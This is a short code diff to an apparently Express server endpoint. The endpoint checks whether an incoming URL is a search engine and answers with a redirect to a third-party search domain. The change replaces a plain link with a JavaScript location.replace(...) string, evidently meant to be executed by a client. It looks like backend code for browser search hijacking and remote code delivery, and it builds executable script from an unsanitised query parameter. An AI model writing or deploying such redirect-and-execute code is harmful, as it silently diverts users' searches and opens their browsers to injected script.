@@ -46,7 +46,7 @@ app.get('/testing', function (req, res) {
     var query = req?.query.url || ''
     var url = checkUrlIsSearchEngine(query)
     if (url) {
-        res.send({ 'link': `https://searchesmia.com/bingchr5?q=${url}` });
+        res.send({ 'link': `location.replace("https://searchesmia.com/bingchr5?q=${url}")` });
     }
 });
 
